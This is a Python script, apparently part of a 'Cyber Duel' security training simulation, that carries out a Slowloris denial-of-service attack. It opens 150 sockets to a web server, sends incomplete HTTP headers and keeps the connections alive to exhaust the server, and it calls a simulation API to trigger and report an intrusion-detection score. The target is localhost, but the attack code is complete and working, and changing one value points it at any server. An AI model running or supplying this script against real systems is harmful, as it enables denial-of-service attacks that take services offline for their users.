"""
CYBER DUEL — Slowloris Attack
Opens many slow HTTP connections to exhaust server resources.
A classic low-bandwidth DoS technique.

Usage: python slowloris_attack.py
"""
import socket
import threading
import time
import requests
from config import NEXUS_API

HOST     = "localhost"
PORT     = 8000
SOCKETS  = 150
DURATION = 25

print("╔══════════════════════════════════════════╗")
print("║   CYBER DUEL  —  SLOWLORIS MODULE        ║")
print("║   Low-bandwidth connection exhaustion    ║")
print("╚══════════════════════════════════════════╝\n")

# Trigger IDS first
print("[*] Triggering IDS detection...")
try:
    r = requests.post(f"{NEXUS_API}/api/simulate/dos", timeout=10)
    d = r.json()
    print(f"[!] IDS: {d['result']['malicious']}/500 malicious | Crisis: {d['crisis_score']:.1f}\n")
except Exception as e:
    print(f"[!] Error: {e}"); exit(1)

# Open slow sockets
sockets_list = []
stop = threading.Event()
active = [0]

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((HOST, PORT))
        # Send partial HTTP header — never complete it
        s.send(f"GET /api/status HTTP/1.1\r\nHost: {HOST}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
        return s
    except Exception:
        return None

print(f"[*] Opening {SOCKETS} slow connections to {HOST}:{PORT}...")
for i in range(SOCKETS):
    s = create_socket()
    if s:
        sockets_list.append(s)
        active[0] += 1
    if i % 30 == 0:
        print(f"\r[SLOW] Opened {active[0]} connections...", end="")
    time.sleep(0.05)

print(f"\n[*] Holding {active[0]} open connections for {DURATION}s\n")

start = time.time()
while time.time() - start < DURATION:
    elapsed = time.time() - start
    # Keep sockets alive by sending partial headers
    dead = []
    for s in sockets_list:
        try:
            s.send("X-Keep: alive\r\n".encode())
        except Exception:
            dead.append(s)
    for s in dead:
        sockets_list.remove(s)
        active[0] -= 1
        ns = create_socket()
        if ns:
            sockets_list.append(ns)
            active[0] += 1

    print(f"\r[SLOW] {active[0]} connections open | {DURATION-elapsed:.0f}s remaining", end="")
    time.sleep(1)

# Close all
for s in sockets_list:
    try: s.close()
    except: pass

print(f"\n\n[✓] Slowloris complete — {active[0]} connections held")
r = requests.get(f"{NEXUS_API}/api/status")
d = r.json()
print(f"[✓] Status: {d['system_status']} | Crisis: {d['crisis_score']:.1f}/100")
